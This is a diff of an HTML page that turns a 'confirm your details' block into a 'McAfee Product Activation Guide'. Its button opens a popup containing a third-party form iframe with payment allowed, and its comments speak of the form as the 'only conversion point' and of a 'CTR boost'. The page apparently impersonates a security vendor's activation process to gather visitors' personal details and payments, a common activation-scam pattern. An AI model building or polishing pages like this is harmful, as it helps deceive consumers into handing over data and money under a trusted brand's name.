@@ -32,42 +32,109 @@
 
   </div>
 
-</header>
-<!-- HERO / TRIO -->
+<!-- HERO -->
 <div style="text-align:center; padding:50px 20px; background:#0b0b0b; color:#fff;">
 
-  <h1 style="font-size:34px; font-weight:800; margin-bottom:15px;">
-    To Continue, Confirm Your Details Below
+  <div style="
+  display:inline-block;
+  background:#ff2b2b;
+  color:#fff;
+  padding:8px 18px;
+  border-radius:30px;
+  font-size:13px;
+  font-weight:700;
+  margin-bottom:20px;
+  letter-spacing:1px;">
+    ACTIVATION GUIDE
+  </div>
+
+  <h1 style="
+  font-size:34px;
+  font-weight:800;
+  margin-bottom:15px;">
+    McAfee Product Activation Guide
   </h1>
 
-  <div style="color:#ff3b3b; font-size:18px; font-weight:bold; letter-spacing:2px; margin-bottom:25px;">
-    XXXXX-XXXXX-XXXXX-XXXXX
+  <p style="
+  font-size:16px;
+  color:#d9d9d9;
+  max-width:700px;
+  margin:0 auto 25px;
+  line-height:1.7;">
+    Follow our activation guide and continue with the verification process.
+  </p>
+
+  <button onclick="openForm()"
+  style="
+  display:inline-block;
+  background:#fff;
+  border:none;
+  padding:14px 28px;
+  border-radius:14px;
+  font-size:18px;
+  font-weight:700;
+  cursor:pointer;
+  color:#111;">
+    Let's Get Started →
+  </button>
+
+</div>
+
+<!-- COGNITO POPUP -->
+<div id="cognitoPopup" style="
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.8);
+z-index:99999;
+overflow:auto;
+">
+
+  <div style="
+  max-width:850px;
+  margin:40px auto;
+  background:#fff;
+  padding:20px;
+  border-radius:15px;
+  position:relative;">
+
+    <button onclick="closeForm()"
+    style="
+    position:absolute;
+    top:10px;
+    right:15px;
+    background:none;
+    border:none;
+    font-size:28px;
+    cursor:pointer;">
+      ×
+    </button>
+
+    <iframe
+      src="https://www.cognitoforms.com/f/My4wsecfpUCM2-wQ_mW_Og/3"
+      allow="payment"
+      style="border:0;width:100%;height:650px;">
+    </iframe>
+
   </div>
 
-  
-
 </div>
 
-<!-- COGNITO FORM (ONLY CONVERSION POINT) -->
-<div style="max-width:800px; margin:30px auto; padding:10px;">
-  <iframe 
-    src="https://www.cognitoforms.com/f/My4wsecfpUCM2-wQ_mW_Og/3"
-    style="border:0; width:100%; height:520px;">
-  </iframe>
+<script>
+function openForm(){
+  document.getElementById('cognitoPopup').style.display='block';
+}
 
-  <script src="https://www.cognitoforms.com/f/iframe.js"></script>
+function closeForm(){
+  document.getElementById('cognitoPopup').style.display='none';
+}
+</script>
 
-</div>
+<script src="https://www.cognitoforms.com/f/iframe.js"></script>
 
-<!-- SECOND CTA (IMPORTANT FOR CTR BOOST) -->
-<div style="text-align:center; margin:40px 0;">
-  <h2 style="font-size:20px;">Continue Secure Access</h2>
-  <p style="color:#aaa;">Enter your details above to proceed</p>
-</div>
-
-  
-
-  </div>
 
 </section>
 <!-- GRAPHIC SECTION -->
